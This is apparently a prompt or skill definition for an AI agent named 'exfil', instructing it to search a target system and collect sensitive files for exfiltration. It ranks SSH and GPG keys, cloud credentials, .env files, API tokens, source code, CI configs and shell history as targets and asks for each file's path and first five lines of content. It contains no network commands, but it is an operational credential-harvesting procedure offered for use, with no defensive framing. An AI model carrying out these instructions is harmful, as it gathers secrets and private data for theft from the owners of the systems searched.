---
name: exfil
description: Find and collect sensitive files for exfiltration
---
Search the target system for sensitive and valuable files. This is a discovery and collection task.

## Search targets (by priority)

1. **Credentials & Keys**: SSH keys (~/.ssh/), GPG keys, AWS/GCP/Azure credentials, .env files, config files with passwords, database connection strings, API keys, tokens
2. **Source Code & Configs**: git repositories, application configs (yaml/json/toml/ini), CI/CD configs, Dockerfiles, k8s manifests
3. **Documents**: recent documents in Desktop/Documents/Downloads, browser bookmarks, notes
4. **History**: shell history (.bash_history, .zsh_history, .psreadline), recently modified files

## Rules

- Only READ files, do NOT modify or delete anything
- For each file found, output: path, size, last modified time, and a brief content preview (first 5 lines)
- Skip binary files, only report text-based files
- Limit search depth to avoid excessive runtime
- Group findings by category in the final summary

Focus on: $ARGUMENTS
